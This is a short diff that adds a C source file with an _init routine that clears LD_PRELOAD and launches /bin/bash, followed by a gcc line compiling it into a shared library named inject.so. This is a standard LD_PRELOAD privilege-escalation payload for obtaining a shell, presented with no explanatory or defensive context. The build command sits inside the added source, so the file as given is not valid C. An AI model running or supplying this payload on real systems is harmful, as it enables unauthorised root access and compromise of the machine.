@@ -1,0 +1,10 @@
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+  unsetenv("LD_PRELOAD");
+  char *const argv[] = {"/bin/bash", NULL};
+  execv(argv[0], argv);
+}
+
+gcc -nostartfiles -shared -o inject.so inject.c
